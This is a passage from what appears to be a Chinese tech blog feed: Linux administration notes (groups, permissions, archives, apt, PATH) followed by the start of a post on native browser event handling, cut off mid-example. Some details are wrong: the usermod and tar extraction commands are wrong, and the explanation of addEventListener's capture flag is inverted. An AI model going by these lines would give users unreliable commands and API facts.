class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd GroupName </span><br></pre></td></tr></table></figure><p>将用户加入组（三选一）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -G GroupName UserName  <span class="comment"># 这个会把用户从其他组中去掉</span></span><br><span class="line">sudo usermod -a GroupName UserName</span><br><span class="line">sudo gpasswd -a UserName GroupName</span><br></pre></td></tr></table></figure><p>查看当前用户所在组：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br><span class="line">&gt; root</span><br></pre></td></tr></table></figure><p>查看固定用户的权限组</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">groups</span> root esunr</span><br><span class="line">&gt; root[用户名]: root[用户组]</span><br><span class="line">&gt; esunr: esunr</span><br></pre></td></tr></table></figure><p>查看组：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/group</span><br><span class="line"></span><br><span class="line">在/etc/group 中的每条记录分四个字段：</span><br><span class="line">第一字段：用户组名称；</span><br><span class="line">第二字段：用户组密码；</span><br><span class="line">第三字段：GID</span><br><span class="line">第四字段：用户列表，每个用户之间用,号分割；本字段可以为空；如果字段为空表示用户组为GID的用户名；</span><br></pre></td></tr></table></figure><h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p>切换用户：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su [username]</span><br></pre></td></tr></table></figure><h3 id="使用-root-用户"><a href="#使用-root-用户" class="headerlink" title="使用 root 用户"></a>使用 root 用户</h3><p>创建并登录root用户：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root <span class="comment"># 创建 root 用户</span></span><br><span class="line">su  <span class="comment"># 登录 root 用户</span></span><br></pre></td></tr></table></figure><h1 id="3-权限相关"><a href="#3-权限相关" class="headerlink" title="3. 权限相关"></a>3. 权限相关</h1><h3 id="权限基本知识"><a href="#权限基本知识" class="headerlink" title="权限基本知识"></a>权限基本知识</h3><p>权限示例：<code>-rw-rw-r--</code></p><p><strong>权限一共有10位数其中：</strong></p><ul><li><p>最前面那个 <code>-</code> 代表的是类型：<code>-</code> 代表文件，<code>d</code> 代表文件夹</p></li><li><p>中间那三个 <code>rw-</code> 代表的是所有者（user）</p></li><li><p>然后那三个 <code>rw-</code> 代表的是组群（group）</p></li><li><p>最后那三个 <code>r--</code> 代表的是其他人（other）</p></li></ul><p><strong>rwx 的含义：</strong></p><p>r 表示文件可以被读（read），w 表示文件可以被写（write），x 表示文件可以被执行（如果它是程序的话）。</p><p><strong>用数字代替rwx：</strong></p><ul><li><p>r = 4</p></li><li><p>w = 2</p></li><li><p>x = 1</p></li></ul><p><strong>Tips：</strong></p><ul><li><p>如果递归删除一个文件夹，文件夹内有当前用户没有权限的文件的话，会跳过删除，只删除有权限的文件。</p></li><li><p>如果一个文件是只读属性，用户去强制修改后原来的文件会被命名为 <code>FileName~</code> 的形式保留下来。</p></li></ul><h3 id="权限的查看"><a href="#权限的查看" class="headerlink" title="权限的查看"></a>权限的查看</h3><p>查看文件权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l FileName  <span class="comment"># 查看指定文件权限</span></span><br><span class="line"><span class="built_in">ls</span> -l <span class="comment"># 查看当前文件夹所有文件的权限详情，如果有子文件是文件夹，则列出文件夹权限详情</span></span><br></pre></td></tr></table></figure><p>查看文件夹权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -ld FolderName   <span class="comment"># 查看指定文件夹权限</span></span><br><span class="line"><span class="built_in">ls</span> -ld <span class="comment"># 查看当前文件夹权限</span></span><br></pre></td></tr></table></figure><p>权限输出：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">total 0 [文件列表总大小]</span><br><span class="line">-rw-rw-r--[权限详情] 1[硬连接个数] esunr[创建人] esunr[归属组] 17[文件大小] Dec 5 17:34 <span class="built_in">test</span>[文件名]</span><br></pre></td></tr></table></figure><blockquote><p>文件被创建后，默认的权限为 -rw-rw-r– 也就是 664</p></blockquote><h3 id="权限的修改"><a href="#权限的修改" class="headerlink" title="权限的修改"></a>权限的修改</h3><p>修改文件权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 FileName</span><br></pre></td></tr></table></figure><p>递归修改文件权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 FolderName</span><br></pre></td></tr></table></figure><p>如果递归修改权限的文件夹中有当前执行指令用户没有权限的文件，那么就会出现提醒拒绝修改，只修改用户有权限的文件。</p><p>修改文件的归属组：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> [-R] 用户名:群组名 文件或目录</span><br></pre></td></tr></table></figure><h1 id="4-文件相关"><a href="#4-文件相关" class="headerlink" title="4. 文件相关"></a>4. 文件相关</h1><h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> [Option] SorceFile TargetFile</span><br><span class="line"><span class="built_in">cp</span> -r FolderName TargetFolder <span class="comment"># 复制文件夹，移动文件夹不受制于权限，文件的权限信息会一并被复制</span></span><br><span class="line"><span class="built_in">cp</span> -r FolderName1/* FolderName2<span class="comment"># 将 FolderName1 下的文件全部覆盖到 FolderName2 下，覆盖文件不会有提示</span></span><br><span class="line"><span class="built_in">cp</span> -r -i FloderName1 FolderName2 <span class="comment"># 将 FolderName1 下的文件全部覆盖到 FolderName2 下，覆盖文件会有提示</span></span><br></pre></td></tr></table></figure><blockquote><p>文件复制默认覆盖，但是文件夹递归复制不会覆盖文件</p></blockquote><p>参数说明：</p><p>-a:是指archive的意思，也说是指复制所有的目录</p><p>-d:若源文件为连接文件(link file)，则复制连接文件属性而非文件本身</p><p>-f:强制(force)，若有重复或其它疑问时，不会询问用户，而强制复制</p><p>-i:若目标文件(destination)已存在，在覆盖时会先询问是否真的操作</p><p>-l:建立硬连接(hard link)的连接文件，而非复制文件本身</p><p>-p:与文件的属性一起复制，而非使用默认属性</p><p>-r:递归复制，用于目录的复制操作</p><p>-s:复制成符号连接文件(symbolic link)，即“快捷方式”文件</p><p>-u:若目标文件比源文件旧，更新目标文件 </p><h3 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理"></a>压缩文件处理</h3><p><strong><code>.tar</code> 文件</strong></p><p>压缩：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf distFilePath（生成压缩包的目录） originFilePath（要压缩的文件目录）</span><br></pre></td></tr></table></figure><blockquote><p>示例：tar -zcvf /home/xahot.tar.gz /xahot</p></blockquote><p>解压：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcxf targetFile</span><br></pre></td></tr></table></figure><p><strong><code>.zip</code> 文件</strong></p><p>压缩：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r distFilePath originFilePath/* -r <span class="comment"># r表示递归</span></span><br></pre></td></tr></table></figure><blockquote><p>示例：zip -r ./xahot.zip ./* -r</p></blockquote><p>linux zip命令参数列表：</p><ul><li><p><code>-a</code> 将文件转成ASCII模式</p></li><li><p><code>-F</code> 尝试修复损坏的压缩文件</p></li><li><p><code>-h</code> 显示帮助界面</p></li><li><p><code>-m</code> 将文件压缩之后，删除源文件</p></li><li><p><code>-n</code> 特定字符串 不压缩具有特定字尾字符串的文件</p></li><li><p><code>-o</code> 将压缩文件内的所有文件的最新变动时间设为压缩时候的时间</p></li><li><p><code>-q</code> 安静模式，在压缩的时候不显示指令的执行过程</p></li><li><p><code>-r</code> 将指定的目录下的所有子目录以及文件一起处理</p></li><li><p><code>-S</code> 包含系统文件和隐含文件（S是大写）</p></li><li><p><code>-t</code> 日期 把压缩文件的最后修改日期设为指定的日期，日期格式为mmddyyyy</p></li></ul><p>解压：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip tragetFile <span class="comment"># 解压到当前目录</span></span><br></pre></td></tr></table></figure><h1 id="5-应用相关"><a href="#5-应用相关" class="headerlink" title="5. 应用相关"></a>5. 应用相关</h1><h3 id="查找应用"><a href="#查找应用" class="headerlink" title="查找应用"></a>查找应用</h3><p>通过以下指令可以查找到安装过的应用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --get-selections | grep appName</span><br></pre></td></tr></table></figure><p>通过以下指令查看安装的应用的详情：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l appName</span><br></pre></td></tr></table></figure><p>通过以下指令查找软件位置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -L appName</span><br></pre></td></tr></table></figure><h3 id="卸载应用"><a href="#卸载应用" class="headerlink" title="卸载应用"></a>卸载应用</h3><p><code>apt-get purge / apt-get --purge remove</code></p><p>删除已安装包（不保留配置文件）。</p><p>如软件包a，依赖软件包b，则执行该命令会删除a，而且不保留配置文件</p><p><code>apt-get autoremove</code></p><p>删除为了满足依赖而安装的，但现在不再需要的软件包（包括已安装包），保留配置文件。</p><p><code>apt-get remove</code></p><p>删除已安装的软件包（保留配置文件），不会删除依赖软件包，且保留配置文件。</p><p><code>apt-get autoclean</code></p><p>APT的底层包是dpkg, 而dpkg 安装Package时, 会将 *.deb 放在 /var/cache/apt/archives/中，apt-get autoclean 只会删除 /var/cache/apt/archives/ 已经过期的deb。</p><p><code>apt-get clean</code></p><p>使用 apt-get clean 会将 /var/cache/apt/archives/ 的 所有 deb 删掉，可以理解为 rm /var/cache/apt/archives/*.deb。</p><h3 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h3><p>当在源码安装的过程中如果在生成内容时用 <code>prefix</code> 设置了源码安装应用的位置，那么安装的应用携带有 bin 文件，是无法自动与系统做关联的，我们就无法在 bash 中直接使用它们，与 Windows 相似的，我们需要添加系统环境变量中的 PATH 才能连接到应用的 bin 文件，这时如果直接在命令行中使用 <code>export</code> 设置 PATH 的话只是临时的，如果想要永久产生影响就还是需要去修改 <code>/etc/.profile</code> 文件，这是在系统每次启动时会自动执行的文件，我们在这里设置 PATH 会让系统在每次开机时都应用这些 PATH，与其相类似的文件还有以下几个：</p><ol><li><p><strong>/etc/profile：</strong> 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从/etc/profile.d目录的配置文件中搜集shell的设置。</p></li><li><p><strong>/etc/bashrc:</strong> 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取（即每次新开一个终端，都会执行bashrc）。</p></li><li><p><strong>~/.bash_profile:</strong> 每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次。默认情况下,设置一些环境变量,执行用户的.bashrc文件。</p></li><li><p><strong>~/.bashrc:</strong> 该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。</p></li><li><p><strong>~/.bash_logout:</strong> 当每次退出系统(退出bash shell)时,执行该文件. 另外,/etc/profile中设定的变量(全局)的可以作用于任何用户,而~/.bashrc等中设定的变量(局部)只能继承 /etc/profile中的变量,他们是”父子”关系。</p></li><li><p><strong>~/.bash_profile:</strong> 是交互式、login 方式进入 bash 运行的~/.bashrc 是交互式 non-login 方式进入 bash 运行的通常二者设置大致相同，所以通常前者会调用后者。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">###### /etc/profile</span></span><br><span class="line"><span class="comment"># $PATH 表示已经设置的环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=xxx/xxx/bin:<span class="variable">$PATH</span> </span><br><span class="line"><span class="comment">######</span></span><br></pre></td></tr></table></figure><p>保存后再运行该文件让其生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><p>输出环境变量检查是否设置成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>温故知新，谈谈浏览器的原生事件</title>
      <link href="/2019/12/642246688abe.html"/>
      <url>/2019/12/642246688abe.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>在现在越来越依赖框架之后，发现框架中的事件绑定已经滚瓜烂熟了，但是原生 HTML 的事件绑定却会发生有时候突然忘了的尴尬，并且在当时什么都不懂的时候，事件绑定这块一直是个坑。那么就来在这里温故一下原生的事件绑定，结合一些新的思想，来重新回顾一下这一块。</p><h1 id="2-事件处理器属性"><a href="#2-事件处理器属性" class="headerlink" title="2. 事件处理器属性"></a>2. 事件处理器属性</h1><p>任何一个 Element 对象都会有相对应的属性，事件处理器属性就是将事件绑定给我们的一个 Element 对象，使函数成为其自身的一个属性，最常见的方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还可以写成：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">btn.<span class="property">onclick</span> = handleClick</span><br></pre></td></tr></table></figure><p>那么问题来了，我们如何向一个 handle 函数传递一个参数呢？或许会写成：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="title function_">handleClick</span>(<span class="string">&quot;this is a message&quot;</span>)</span><br></pre></td></tr></table></figure><p>这时候就会发现，在网页初始化时已经执行了该函数，此时 <code>btn.onclick</code> 的值已经被赋为了 <code>handleClikc</code> 函数执行后的返回值，这是因为我们在写入 <code>handleClick(&quot;this is a message&quot;)</code> 就意味着函数在此出执行，并将函数返回值赋值给等号前的对象，说的高大上一点就是做了一次 LHS 引用。</p><p>所以呢，如何解决呢？这一招就是从 React 事件绑定学来的，既然 <code>onclick</code> 的值是一个待执行函数，那么我们就在此定义一个函数将目标函数包裹起来，此时外部函数未执行，内部函数引用存放于堆内存中，此时也不会执行。于是我们就可以这样绑定：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">handleClick</span>(<span class="string">&quot;this is a message&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写一个事件节流函数，主要使用了这个方式传递节流函数的参数：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Click me!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, time</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> startTime = <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> args = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">arguments</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> currentTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">valueOf</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (currentTime - startTime &gt; time) &#123;</span></span><br><span class="line"><span class="language-javascript">          fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args)</span></span><br><span class="line"><span class="language-javascript">          startTime = currentTime</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> throttleClick = <span class="title function_">throttle</span>(<span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(msg);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#button&quot;</span>).<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123; <span class="title function_">throttleClick</span>(<span class="string">&quot;msg&quot;</span>) &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="3-行内事件处理器"><a href="#3-行内事件处理器" class="headerlink" title="3. 行内事件处理器"></a>3. 行内事件处理器</h1><p>行内事件处理器就是将执行函数作为 HTML 标签的一个属性写入，但是这是一种非常原始的写法，这种习惯也并不好。</p><p>我们在这里需要注意的是，与 <strong>事件处理器属性</strong> 不同，行内事件处理器是将函数的执行写于行内，举一个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;handleClick()&quot;</span>&gt;</span>Click me!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其意思就是当按钮被点击时，JS 引擎会解析 <code>onclick</code> 属性中的 js 代码并执行，而并非是事件处理器属性的为其绑定一个函数在其触发事件时被调用。就算是我们直接写一个纯 JS 代码也会被执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Hello, this is my old-fashioned event handler!&#x27;);&quot;</span>&gt;</span>Press me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但这样我们就可以直接对函数传参，不过为了养成一个良好的编程习惯，还是不推荐使用。</p><h1 id="4-addEventListener-removeEventListener"><a href="#4-addEventListener-removeEventListener" class="headerlink" title="4. addEventListener removeEventListener"></a>4. addEventListener removeEventListener</h1><blockquote><p>新的事件触发机制被定义在 Document Object Model (DOM) Level 2 Events Specification, 这个细则给浏览器提供了一个函数 — addEventListener()。这个函数和事件处理属性是类似的，但是语法略有不同</p></blockquote><p>这个解释的逻辑就是，我们为一个 Element 添加了一个事件监听器，当被监听的事件触发之后，就会执行监听器中我们传入的函数。这样的思想有一个显而易见的好处，那就是可以针对一个元素的同一事件，添加多个监听，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>btn<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">click1</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">click2</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#btn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, click1)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#btn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, click2)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击后输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>同时我们要注意 <code>addEventListener</code> 的第三个参数，是否开启事件捕获，默认为 <code>false</code>。</p><p><code>addEventListener</code> 是为事件添加了事件监听，相应的，我们还可以使用 <code>removeEventListener</code> 移除一个已添加的事件。在 SPA 应用中每个页面在销毁的时候需要注意注销页面上（并非组件上）挂载的事件，如 window 上绑定的滚动事件等：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#btn&quot;</span>).<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, click1)</span><br></pre></td></tr></table></figure><blockquote><p>addEventListener 仅支持 IE9+</p></blockquote><h1 id="5-阻止行为"><a href="#5-阻止行为" class="headerlink" title="5. 阻止行为"></a>5. 阻止行为</h1><p>随着事件的发生，往往还伴随着一些不可预料的行为发生，我们需要阻止这些行为，从而解决他们对我们当前业务的影响。我们通常可以阻止的行为有：事件的默认行为、冒泡行为、捕获行为。</p><p><strong>阻止默认行为：</strong></p><p>使用 <code>e.preventDefault()</code> 可以阻止事件的默认行为，e 为当前的事件对象，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">form.<span class="property">onsubmit</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="comment">// 阻止了表单的默认提交</span></span><br><span class="line">  e.<span class="title function_">preventDefault</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>阻止冒泡行为：</strong></p><p>使用 <code>e.stopPropagation()</code> 可以阻止冒泡行为，e 为当前的事件对象。</p><p><strong>阻止捕获行为：</strong></p><p>事件捕获是默认阻止的，如果想要开启事件捕获就可以使用 <code>Element.addEventListener()</code>  的第三个参数设置为 <code>true</code> 来开启事件捕获。</p><h1 id="6-事件的冒泡与捕获"><a href="#6-事件的冒泡与捕获" class="headerlink" title="6. 事件的冒泡与捕获"></a>6. 事件的冒泡与捕获</h1><p>事件的触发被分为两个阶段，事件的冒泡阶段与事件的捕获阶段，当我们使用 <code>Element.addEventListener()</code> 添加元素事件时，该方法的第三个参数决定了当前绑定的函数所执行的阶段：</p><ul><li>默认为 <code>true</code> 时，被绑定的函数仅仅在冒泡阶段被调用；</li><li>当修改为 <code>false</code> 时，被绑定的函数仅仅在捕获阶段被调用。</li></ul><blockquote><p>这里之前有一个误解，误以为第三个参数修改的是目标对象在触发事件时是否开启事件捕获。其实际上的意思时当前绑定的事件如果是由于子元素的事件触发而被动触发的，那么 <code>addEventListener</code> 的第三个参数，决定了当前的事件被动触发是在事件捕获阶段触发的还是在事件冒泡阶段触发的。</p></blockquote><p>举个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;b&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 